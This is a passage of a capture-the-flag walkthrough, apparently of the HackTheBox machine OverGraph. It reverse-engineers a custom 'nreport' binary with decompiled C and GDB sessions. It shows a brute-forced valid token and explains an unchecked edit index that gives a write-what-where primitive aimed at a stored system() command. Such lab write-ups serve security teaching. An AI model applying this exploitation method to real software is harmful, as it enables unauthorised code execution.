+<span class=mtk1>    </span><span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">uint</span><span class=mtk1> </span><span class=mtk5>*</span><span class=mtk1>) ((</span><span class="mtk7 mtki">long</span><span class=mtk1>) </span><span class=mtk5>&amp;</span><span class=mtk1>local_48 </span><span class=mtk5>+</span><span class=mtk1> (</span><span class="mtk7 mtki">long</span><span class=mtk1>) i </span><span class=mtk5>*</span><span class=mtk1> </span><span class=mtk6>4</span><span class=mtk1>) </span><span class=mtk5>=</span>
+<span class=mtk1>         </span><span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">uint</span><span class=mtk1> </span><span class=mtk5>*</span><span class=mtk1>) (secret </span><span class=mtk5>+</span><span class=mtk1> (</span><span class="mtk7 mtki">long</span><span class=mtk1>) i </span><span class=mtk5>*</span><span class=mtk1> </span><span class=mtk6>4</span><span class=mtk1>) </span><span class=mtk5>^</span><span class=mtk1> (</span><span class="mtk7 mtki">int</span><span class=mtk1>) userinfo1[</span><span class=mtk6>121</span><span class=mtk1>] </span><span class=mtk5>^</span><span class=mtk1> (</span><span class="mtk7 mtki">int</span><span class=mtk1>) userinfo1[</span><span class=mtk6>122</span><span class=mtk1>] </span><span class=mtk5>^</span>  
+<span class=mtk1>         (</span><span class="mtk7 mtki">int</span><span class=mtk1>) userinfo1[</span><span class=mtk6>120</span><span class=mtk1>] </span><span class=mtk5>^</span><span class=mtk1> (</span><span class="mtk7 mtki">int</span><span class=mtk1>) userinfo1[</span><span class=mtk6>129</span><span class=mtk1>] </span><span class=mtk5>^</span><span class=mtk1> (</span><span class="mtk7 mtki">int</span><span class=mtk1>) userinfo1[</span><span class=mtk6>133</span><span class=mtk1>];</span>
+<span class=mtk1>  }</span>
+
+<span class=mtk1>  </span><span class=mtk5>if</span><span class=mtk1> ((</span><span class="mtk7 mtki">int</span><span class=mtk1>) local_40 </span><span class=mtk5>+</span><span class=mtk1> (</span><span class="mtk7 mtki">int</span><span class=mtk1>) local_48 </span><span class=mtk5>+</span><span class=mtk1> local_48._4_4_ </span><span class=mtk5>!=</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>134</span><span class=mtk1>) {</span>
+<span class=mtk1>    </span><span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"Invalid Token"</span><span class=mtk1>);</span>
+<span class=mtk3>                    /* WARNING: Subroutine does no</span><span class=mtk3>t return */</span>
+<span class=mtk1>    </span><span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>);</span>
+<span class=mtk1>  }</span>
+
+<span class=mtk1>  </span><span class=mtk5>if</span><span class=mtk1> (local_28._4_4_ </span><span class=mtk5>+</span><span class=mtk1> local_30._4_4_ </span><span class=mtk5>+</span><span class=mtk1> (</span><span class="mtk7 mtki">int</span><span class=mtk1>) local_28 </span><span class=mtk5>!=</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>145</span><span class=mtk1>) {</span>
+<span class=mtk1>    </span><span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"Invalid Token"</span><span class=mtk1>);</span>
+<span class=mtk3>                    /* WARNING: Subroutine does no</span><span class=mtk3>t return */</span>
+<span class=mtk1>    </span><span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>);</span>
+<span class=mtk1>  }</span>
+
+<span class=mtk1>  </span><span class=mtk5>if</span><span class=mtk1> (local_18._4_4_ </span><span class=mtk5>+</span><span class=mtk1> local_20._4_4_ </span><span class=mtk5>+</span><span class=mtk1> (</span><span class="mtk7 mtki">int</span><span class=mtk1>) local_18 </span><span class=mtk5>!=</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>109</span><span class=mtk1>) {</span>
+<span class=mtk1>    </span><span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"Invalid Token"</span><span class=mtk1>);</span>
+<span class=mtk3>                    /* WARNING: Subroutine does no</span><span class=mtk3>t return */</span>
+<span class=mtk1>    </span><span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>);</span>
+<span class=mtk1>  }</span>
+</code></pre></div><p>The first check is that the token length must be 15 bytes, that&rsquo;s easy. Well, actually 14, because the last one is the new line character (<code>\n</code>).</p><p>Then, the program performs a XOR operation with a <code>secret</code> variable and some of the bytes we entered. Actually, these bytes are <code>userinfo1[120]</code>, <code>userinfo1[121]</code>, <code>userinfo1[122]</code>, <code>userinfo1[129]</code> and <code>userinfo1[133]</code>. The rest of the bytes do not matter. For this reason, we can use a brute force attack on these 5 bytes until we find a valid token (there are several ones). For that, I wrote a simple Python script using <code>pwntools</code>: <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/OverGraph/bf_token.py><code>bf_token.py</code></a> (detailed explanation <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/OverGraph#bf_tokenpy>here</a>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>bf_token.py</span>
+[<span class=code-blue>*</span>] './nreport_patched'
+    Arch:     amd64-64-little
+    RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
+    Stack:    <span class=code-dark-green>Canary found</span>
+    NX:       <span class=code-dark-green>NX enabled</span>
+    PIE:      <span class=code-dark-red>No PIE (0x3fd000)</span>
+    RUNPATH:  <span class=code-dark-red>b'./libc'</span>
+
+[<span class=code-green>+</span>] Valid token: hD]AAAAAAVAAAT
+
+<span class=code-cyan>$</span> <span class=code-dark-green>./nreport_patched</span>
+Custom Reporting v1
+
+Enter Your Token: hD]AAAAAAVAAAT  
+Enter Name: asdf
+
+Welcome asdf
+1.Create New Message
+2.Delete a Message
+3.Edit Messages
+4.Report All Messages
+5.Exit
+&gt;
+</code></pre></div><h2 id=planning-the-exploit>Planning the exploit</h2><p>Now we get to the menu we saw in <code>main</code>. It seems to be like a common heap exploitation challenge.</p><p>In fact, if we analyze functions <code>create</code>, <code>delete</code> and <code>edit</code>, all of them use <code>calloc</code> and <code>free</code>, so we are dealing with the heap address space:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">void</span><span class=mtk1> </span><span class=mtk8>create</span><span class=mtk1>() {</span>
+<span class=mtk1>  </span><span class="mtk7 mtki">void</span><span class=mtk1> </span><span class=mtk5>*</span><span class=mtk1>pvVar1;</span>
+<span class=mtk1>  </span>
+<span class=mtk1>  </span><span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>\n</span><span class=mtk4>You can only create 10 messages at a time</span><span class=mtk6>\n</span><span class=mtk4>Messages Created: </span><span class=mtk6>%i\n\n</span><span class=mtk4>"</span><span class=mtk1>, (ulong) Arryindex);</span>  
+<span class=mtk1>  pvVar1 </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk8>calloc</span><span class=mtk1>(</span><span class=mtk6>1</span><span class=mtk1>, </span><span class=mtk5>0x</span><span class=mtk6>a1</span><span class=mtk1>);</span>
+<span class=mtk1>  </span><span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Message Title: "</span><span class=mtk1>);</span>
+<span class=mtk1>  </span><span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>" </span><span class=mtk10>%</span><span class=mtk4>59[^</span><span class=mtk6>\n</span><span class=mtk4>]"</span><span class=mtk1>, pvVar1);</span>
+<span class=mtk1>  </span><span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Message: "</span><span class=mtk1>);</span>
+<span class=mtk1>  </span><span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>" </span><span class=mtk10>%</span><span class=mtk4>100[^</span><span class=mtk6>\n</span><span class=mtk4>]"</span><span class=mtk1>, (</span><span class="mtk7 mtki">long</span><span class=mtk1>) pvVar1 </span><span class=mtk5>+</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>3c</span><span class=mtk1>);</span>
+<span class=mtk1>  </span><span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">void</span><span class=mtk1> </span><span class=mtk5>**</span><span class=mtk1>) (message_array </span><span class=mtk5>+</span><span class=mtk1> (</span><span class="mtk7 mtki">long</span><span class=mtk1>) (</span><span class="mtk7 mtki">int</span><span class=mtk1>) Arryindex </span><span class=mtk5>*</span><span class=mtk1> </span><span class=mtk6>8</span><span class=mtk1>) </span><span class=mtk5>=</span><span class=mtk1> pvVar1;</span>
+<span class=mtk1>  Arryindex </span><span class=mtk5>=</span><span class=mtk1> Arryindex </span><span class=mtk5>+</span><span class=mtk1> </span><span class=mtk6>1</span><span class=mtk1>;</span>
+
+<span class=mtk1>  </span><span class=mtk5>return</span><span class=mtk1>;</span>
+<span class=mtk1>}</span>
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">void</span><span class=mtk1> </span><span class=mtk8>delete</span><span class=mtk1>() {</span>
+<span class=mtk1>  </span><span class="mtk7 mtki">long</span><span class=mtk1> in_FS_OFFSET;</span>
+<span class=mtk1>  </span><span class="mtk7 mtki">int</span><span class=mtk1> index;</span>
+<span class=mtk1>  </span><span class="mtk7 mtki">long</span><span class=mtk1> canary;</span>
+<span class=mtk1>  </span>
+<span class=mtk1>  canary </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">long</span><span class=mtk1> </span><span class=mtk5>*</span><span class=mtk1>) (in_FS_OFFSET </span><span class=mtk5>+</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>28</span><span class=mtk1>);</span>
+<span class=mtk1>  </span><span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Message number to delete: "</span><span class=mtk1>);</span>
+<span class=mtk1>  </span><span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%d</span><span class=mtk4>[^</span><span class=mtk6>\n</span><span class=mtk4>]"</span><span class=mtk1>, </span><span class=mtk5>&amp;</span><span class=mtk1>index);</span>
+<span class=mtk1>  </span><span class=mtk8>free</span><span class=mtk1>(</span><span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">void</span><span class=mtk1> </span><span class=mtk5>**</span><span class=mtk1>) (message_array </span><span class=mtk5>+</span><span class=mtk1> (</span><span class="mtk7 mtki">long</span><span class=mtk1>) index </span><span class=mtk5>*</span><span class=mtk1> </span><span class=mtk6>8</span><span class=mtk1>));</span>
+<span class=mtk1>  Arryindex </span><span class=mtk5>=</span><span class=mtk1> Arryindex </span><span class=mtk5>-</span><span class=mtk1> </span><span class=mtk6>1</span><span class=mtk1>;</span>
+<span class=mtk1>  </span><span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>\n</span><span class=mtk4>Message Deleted"</span><span class=mtk1>);</span>
+
+<span class=mtk1>  </span><span class=mtk5>if</span><span class=mtk1> (canary </span><span class=mtk5>!=</span><span class=mtk1> </span><span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">long</span><span class=mtk1> </span><span class=mtk5>*</span><span class=mtk1>) (in_FS_OFFSET </span><span class=mtk5>+</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>28</span><span class=mtk1>)) {</span>
+<span class=mtk3>                    /* WARNING: Subroutine does no</span><span class=mtk3>t return */</span>  
+<span class=mtk1>    </span><span class=mtk8>__stack_chk_fail</span><span class=mtk1>();</span>
+<span class=mtk1>  }</span>
+
+<span class=mtk1>  </span><span class=mtk5>return</span><span class=mtk1>;</span>
+<span class=mtk1>}</span>
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">void</span><span class=mtk1> </span><span class=mtk8>edit</span><span class=mtk1>() {</span>
+<span class=mtk1>  </span><span class="mtk7 mtki">long</span><span class=mtk1> in_FS_OFFSET;</span>
+<span class=mtk1>  </span><span class="mtk7 mtki">int</span><span class=mtk1> index;</span>
+<span class=mtk1>  </span><span class="mtk7 mtki">long</span><span class=mtk1> canary;</span>
+<span class=mtk1>  </span>
+<span class=mtk1>  canary </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">long</span><span class=mtk1> </span><span class=mtk5>*</span><span class=mtk1>) (in_FS_OFFSET </span><span class=mtk5>+</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>28</span><span class=mtk1>);</span>
+
+<span class=mtk1>  </span><span class=mtk5>if</span><span class=mtk1> (Arryindex </span><span class=mtk5>==</span><span class=mtk1> </span><span class=mtk6>0</span><span class=mtk1>) {</span>
+<span class=mtk1>    </span><span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"No Message Created"</span><span class=mtk1>);</span>
+<span class=mtk1>  } </span><span class=mtk5>else</span><span class=mtk1> {</span>
+<span class=mtk1>    </span><span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Enter number to edit: "</span><span class=mtk1>);</span>
+<span class=mtk1>    </span><span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%d</span><span class=mtk4>[^</span><span class=mtk6>\n</span><span class=mtk4>]"</span><span class=mtk1>, </span><span class=mtk5>&amp;</span><span class=mtk1>index);</span>
+<span class=mtk1>    </span><span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Message Title: "</span><span class=mtk1>);</span>
+<span class=mtk1>    </span><span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>" </span><span class=mtk10>%</span><span class=mtk4>59[^</span><span class=mtk6>\n</span><span class=mtk4>]"</span><span class=mtk1>, </span><span class=mtk5>*</span><span class=mtk1>(undefined8 </span><span class=mtk5>*</span><span class=mtk1>) (message_array </span><span class=mtk5>+</span><span class=mtk1> (</span><span class="mtk7 mtki">long</span><span class=mtk1>) index </span><span class=mtk5>*</span><span class=mtk1> </span><span class=mtk6>8</span><span class=mtk1>));</span>
+<span class=mtk1>    </span><span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Message: "</span><span class=mtk1>);</span>
+<span class=mtk1>    </span><span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk10>%</span><span class=mtk4>100[^</span><span class=mtk6>\n</span><span class=mtk4>]"</span><span class=mtk1>, </span><span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">long</span><span class=mtk1> </span><span class=mtk5>*</span><span class=mtk1>) (message_array </span><span class=mtk5>+</span><span class=mtk1> (</span><span class="mtk7 mtki">long</span><span class=mtk1>) index </span><span class=mtk5>*</span><span class=mtk1> </span><span class=mtk6>8</span><span class=mtk1>) </span><span class=mtk5>+</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>3c</span><span class=mtk1>);</span>  
+<span class=mtk1>    </span><span class=mtk8>fflush</span><span class=mtk1>(stdin);</span>
+<span class=mtk1>    </span><span class=mtk8>fflush</span><span class=mtk1>(stdout);</span>
+<span class=mtk1>  }</span>
+
+<span class=mtk1>  </span><span class=mtk5>if</span><span class=mtk1> (canary </span><span class=mtk5>!=</span><span class=mtk1> </span><span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">long</span><span class=mtk1> </span><span class=mtk5>*</span><span class=mtk1>) (in_FS_OFFSET </span><span class=mtk5>+</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>28</span><span class=mtk1>)) {</span>
+<span class=mtk3>                    /* WARNING: Subroutine does no</span><span class=mtk3>t return */</span>
+<span class=mtk1>    </span><span class=mtk8>__stack_chk_fail</span><span class=mtk1>();</span>
+<span class=mtk1>  }</span>
+
+<span class=mtk1>  </span><span class=mtk5>return</span><span class=mtk1>;</span>
+<span class=mtk1>}</span>
+</code></pre></div><p>However, there&rsquo;s not much to do with a heap exploit. Although it is possible to perform an Unsorted Bin Attack, we can&rsquo;t leverage it to something more critical or it will be very difficult to achieve. This attack is possible because we can edit released chunks and modify the <code>bk</code> pointer, so that when allocating a new chunk, an address of <code>main_arena</code> will be written to the address at <code>bk</code> (more information in <a href=https://guyinatuxedo.github.io/31-unsortedbin_attack/unsorted_explanation/index.html>Nightmare</a>). You can forget about this if you didn&rsquo;t understand, it won&rsquo;t be necessary.</p><p>A successful exploit for this binary has nothing to do with the heap address space. In fact, let&rsquo;s examine carefully these lines of <code>edit</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Enter number to edit: "</span><span class=mtk1>);</span>
+<span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%d</span><span class=mtk4>[^</span><span class=mtk6>\n</span><span class=mtk4>]"</span><span class=mtk1>, </span><span class=mtk5>&amp;</span><span class=mtk1>index);</span>
+<span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Message Title: "</span><span class=mtk1>);</span>
+<span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>" </span><span class=mtk10>%</span><span class=mtk4>59[^</span><span class=mtk6>\n</span><span class=mtk4>]"</span><span class=mtk1>, </span><span class=mtk5>*</span><span class=mtk1>(undefined8 </span><span class=mtk5>*</span><span class=mtk1>) (message_array </span><span class=mtk5>+</span><span class=mtk1> (</span><span class="mtk7 mtki">long</span><span class=mtk1>) index </span><span class=mtk5>*</span><span class=mtk1> </span><span class=mtk6>8</span><span class=mtk1>));</span>  
+</code></pre></div><p>Can you see the bug? Yes, the program asks for an index and then it will use it as an offset to compute the address to write to (<code>message_array + index * 8</code>). Since there is no validation on the index, we can control where to write (that&rsquo;s a write-what-where primitive). Let&rsquo;s check it using GDB some variables that are in <code>auth</code> after entering a valid token:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>gdb</span> -q <span class=mtku>./nreport_patched</span>
+Reading symbols from <span class=code-dark-green>./nreport_patched</span>...
+(No debugging symbols found in <span class=code-dark-green>./nreport_patched</span>)
+<span class=code-red>gef➤  </span>run
+Starting program: /home/rocky/Desktop/HTB/Machines/OverGraph/nreport_patched
+Custom Reporting v1
+
+Enter Your Token: hD]AAAAAAVAAAT
+Enter Name: asdf
+
+Welcome asdf
+1.Create New Message
+2.Delete a Message
+3.Edit Messages
+4.Report All Messages
+5.Exit
+&gt; ^C
+Program received signal SIGINT, Interrupt.
+<span class=code-dark-blue>0x00007ffff7b18ad0</span> in <span class=code-dark-yellow>__read_nocancel</span> () at <span class=code-dark-green>../sysdeps/unix/syscall-template.S</span>:84  
+84      ../sysdeps/unix/syscall-template.S: No such file or directory.
+</code></pre></div><p>For example, we have a global variable called <code>userinfo1</code>, which is referenced as <code>userinfo1</code>, <code>userinfo1 + 40</code>, <code>userinfo1 + 0x78</code> and <code>userinfo1 + 140</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤  </span>x/s (char *) &userinfo1
+<span class=code-dark-blue>0x404180</span> &lt;<span class=code-dark-yellow>userinfo1</span>&gt;:   "asdf"
+<span class=code-green>gef➤  </span>x/s (char *)&userinfo1+40
+<span class=code-dark-blue>0x4041a8</span> &lt;<span class=code-dark-yellow>userinfo1</span>+40&gt;:        "echo \"Last Used On $(date)\" &gt;&gt; /var/log/kreport"  
+<span class=code-green>gef➤  </span>x/s (char *) &userinfo1 + 0x78
+<span class=code-dark-blue>0x4041f8</span> &lt;<span class=code-dark-yellow>userinfo1</span>+120&gt;:       "hD]AAAAAAVAAAT\n"
+<span class=code-green>gef➤  </span>x/s (char *) &userinfo1 + 140
+<span class=code-dark-blue>0x40420c</span> &lt;<span class=code-dark-yellow>userinfo1</span>+140&gt;:       "/opt/crv1/asdf"
+</code></pre></div><p>Here we have some interesting things:</p><ul><li>The string <code>"asdf"</code> (our name) is something we can control</li><li>The string <code>"echo \"Last Used On $(date)\" >> /var/log/kreport"</code> is used as a system command right before the exit option (<code>5</code>)</li><li>The string <code>"/opt/crv1/asdf"</code> will be the file where the function <code>report</code> will output our messages</li></ul><p>Furthermore, these are the addresses of <code>message_array</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤  </span>x/40gx &message_array
+<span class=code-dark-blue>0x404120</span> &lt;<span class=code-dark-yellow>message_array</span>&gt;:       0x0000000000000000      0x0000000000000000  
+<span class=code-dark-blue>0x404130</span> &lt;<span class=code-dark-yellow>message_array</span>+16&gt;:    0x0000000000000000      0x0000000000000000
+<span class=code-dark-blue>0x404140</span> &lt;<span class=code-dark-yellow>message_array</span>+32&gt;:    0x0000000000000000      0x0000000000000000
+<span class=code-dark-blue>0x404150</span> &lt;<span class=code-dark-yellow>message_array</span>+48&gt;:    0x0000000000000000      0x0000000000000000
+<span class=code-dark-blue>0x404160</span> &lt;<span class=code-dark-yellow>message_array</span>+64&gt;:    0x0000000000000000      0x0000000000000000
+<span class=code-dark-blue>0x404170</span>:       0x0000000000000000      0x0000000000000000
+<span class=code-dark-blue>0x404180</span> &lt;<span class=code-dark-yellow>userinfo1</span>&gt;:   0x0000000066647361      0x0000000000000000
+<span class=code-dark-blue>0x404190</span> &lt;<span class=code-dark-yellow>userinfo1</span>+16&gt;:        0x0000000000000000      0x0000000000000000
+<span class=code-dark-blue>0x4041a0</span> &lt;<span class=code-dark-yellow>userinfo1</span>+32&gt;:        0x0000000000000000      0x614c22206f686365
+<span class=code-dark-blue>0x4041b0</span> &lt;<span class=code-dark-yellow>userinfo1</span>+48&gt;:        0x2064657355207473      0x7461642824206e4f
+<span class=code-dark-blue>0x4041c0</span> &lt;<span class=code-dark-yellow>userinfo1</span>+64&gt;:        0x2f203e3e20222965      0x2f676f6c2f726176
+<span class=code-dark-blue>0x4041d0</span> &lt;<span class=code-dark-yellow>userinfo1</span>+80&gt;:        0x0074726f7065726b      0x0000000000000000
+<span class=code-dark-blue>0x4041e0</span> &lt;<span class=code-dark-yellow>userinfo1</span>+96&gt;:        0x0000000000000000      0x0000000000000000
+<span class=code-dark-blue>0x4041f0</span> &lt;<span class=code-dark-yellow>userinfo1</span>+112&gt;:       0x0000000000000000      0x41414141415d4468
+<span class=code-dark-blue>0x404200</span> &lt;<span class=code-dark-yellow>userinfo1</span>+128&gt;:       0x000a544141415641      0x74706f2f00000000
+<span class=code-dark-blue>0x404210</span> &lt;<span class=code-dark-yellow>userinfo1</span>+144&gt;:       0x73612f317672632f      0x0000000000006664
+<span class=code-dark-blue>0x404220</span> &lt;<span class=code-dark-yellow>userinfo1</span>+160&gt;:       0x0000000000000000      0x0000000000000000
+<span class=code-dark-blue>0x404230</span>:       0x0000000000000000      0x0000000000000000
+<span class=code-dark-blue>0x404240</span>:       0x0000000000000000      0x0000000000000000
+<span class=code-dark-blue>0x404250</span>:       0x0000000000000000      0x0000000000000000
+</code></pre></div><p>For the moment, let&rsquo;s create a message:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤  </span>continue
+Continuing.
+1
+
+You can only create 10 messages at a time
+Messages Created: 0
+
+Message Title: AAAA
+Message: BBBB
+
+1.Create New Message
+2.Delete a Message
+3.Edit Messages
+4.Report All Messages
+5.Exit
+&gt; ^C
+Program received signal SIGINT, Interrupt.
+<span class=code-dark-blue>0x00007ffff7b18ad0</span> in <span class=code-dark-yellow>__read_nocancel</span> () at <span class=code-dark-green>../sysdeps/unix/syscall-template.S</span>:84  
+84      in <span class=code-dark-green>../sysdeps/unix/syscall-template.S
+</code></pre></div><p>Now, if we print the contents of <code>message_array</code>, we see an address (<code>0x405830</code>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤  </span>x/40gx &message_array
+<span class=code-dark-blue>0x404120</span> &lt;<span class=code-dark-yellow>message_array</span>&gt;:       0x0000000000405830      0x0000000000000000  
+<span class=code-dark-blue>0x404130</span> &lt;<span class=code-dark-yellow>message_array</span>+16&gt;:    0x0000000000000000      0x0000000000000000
+<span class=code-dark-blue>0x404140</span> &lt;<span class=code-dark-yellow>message_array</span>+32&gt;:    0x0000000000000000      0x0000000000000000
+<span class=code-dark-blue>0x404150</span> &lt;<span class=code-dark-yellow>message_array</span>+48&gt;:    0x0000000000000000      0x0000000000000000
+<span class=code-dark-blue>0x404160</span> &lt;<span class=code-dark-yellow>message_array</span>+64&gt;:    0x0000000000000000      0x0000000000000000
+<span class=code-dark-blue>0x404170</span>:       0x0000000000000000      0x0000000000000000
+<span class=code-dark-blue>0x404180</span> &lt;<span class=code-dark-yellow>userinfo1</span>&gt;:   0x0000000066647361      0x0000000000000000
+<span class=code-dark-blue>0x404190</span> &lt;<span class=code-dark-yellow>userinfo1</span>+16&gt;:        0x0000000000000000      0x0000000000000000
+<span class=code-dark-blue>0x4041a0</span> &lt;<span class=code-dark-yellow>userinfo1</span>+32&gt;:        0x0000000000000000      0x614c22206f686365
+<span class=code-dark-blue>0x4041b0</span> &lt;<span class=code-dark-yellow>userinfo1</span>+48&gt;:        0x2064657355207473      0x7461642824206e4f
+<span class=code-dark-blue>0x4041c0</span> &lt;<span class=code-dark-yellow>userinfo1</span>+64&gt;:        0x2f203e3e20222965      0x2f676f6c2f726176
+<span class=code-dark-blue>0x4041d0</span> &lt;<span class=code-dark-yellow>userinfo1</span>+80&gt;:        0x0074726f7065726b      0x0000000000000000
+<span class=code-dark-blue>0x4041e0</span> &lt;<span class=code-dark-yellow>userinfo1</span>+96&gt;:        0x0000000000000000      0x0000000000000000
+<span class=code-dark-blue>0x4041f0</span> &lt;<span class=code-dark-yellow>userinfo1</span>+112&gt;:       0x0000000000000000      0x41414141415d4468
+<span class=code-dark-blue>0x404200</span> &lt;<span class=code-dark-yellow>userinfo1</span>+128&gt;:       0x000a544141415641      0x74706f2f00000000
+<span class=code-dark-blue>0x404210</span> &lt;<span class=code-dark-yellow>userinfo1</span>+144&gt;:       0x73612f317672632f      0x0000000000006664
+<span class=code-dark-blue>0x404220</span> &lt;<span class=code-dark-yellow>userinfo1</span>+160&gt;:       0x0000000000000000      0x0000000000000000
+<span class=code-dark-blue>0x404230</span>:       0x0000000000000000      0x0000000000000000
+<span class=code-dark-blue>0x404240</span>:       0x0000000000000000      0x0000000000000000
+<span class=code-dark-blue>0x404250</span>:       0x0000000000000000      0x0000000000000000
+</code></pre></div><p>And in this address we have our message (as a heap chunk):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤  </span>x/30gx 0x0000000000405830 - 0x10
+<span class=code-dark-blue>0x405820</span>:       0x0000000000000000      0x00000000000000b1  
+<span class=code-dark-blue>0x405830</span>:       0x0000000041414141      0x0000000000000000
+<span class=code-dark-blue>0x405840</span>:       0x0000000000000000      0x0000000000000000
+<span class=code-dark-blue>0x405850</span>:       0x0000000000000000      0x0000000000000000
+<span class=code-dark-blue>0x405860</span>:       0x0000000000000000      0x4242424200000000
+<span class=code-dark-blue>0x405870</span>:       0x0000000000000000      0x0000000000000000
+<span class=code-dark-blue>0x405880</span>:       0x0000000000000000      0x0000000000000000
+<span class=code-dark-blue>0x405890</span>:       0x0000000000000000      0x0000000000000000
+<span class=code-dark-blue>0x4058a0</span>:       0x0000000000000000      0x0000000000000000
+<span class=code-dark-blue>0x4058b0</span>:       0x0000000000000000      0x0000000000000000
+<span class=code-dark-blue>0x4058c0</span>:       0x0000000000000000      0x0000000000000000
+<span class=code-dark-blue>0x4058d0</span>:       0x0000000000000000      0x0000000000020731
+<span class=code-dark-blue>0x4058e0</span>:       0x0000000000000000      0x0000000000000000
+<span class=code-dark-blue>0x4058f0</span>:       0x0000000000000000      0x0000000000000000
+<span class=code-dark-blue>0x405900</span>:       0x0000000000000000      0x0000000000000000
+</code></pre></div><p>When using the <code>edit</code> function, the program will ask for an index. And the address to write will be calculated as <code>message_array + index * 8</code>. Since the binary is not protected with PIE, <code>message_array</code> will have a fix address (<code>0x404120</code>). Hence, the target address will be <code>0x404120 + index * 8</code>.</p><p>Since we control what to store as username (placed at <code>userinfo1</code>, <code>0x404180</code>), we can enter here an address that we would want to write to. And to tell the program to use our username as address, we must use <code>12</code> as index (<code>12 = (0x404180 - 0x404120) / 8</code>). Let&rsquo;s try it right now:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤  </span>continue
+Continuing.
+3
+Enter number to edit: 12
+Message Title: XXXX
+
+Program received signal SIGSEGV, Segmentation fault.
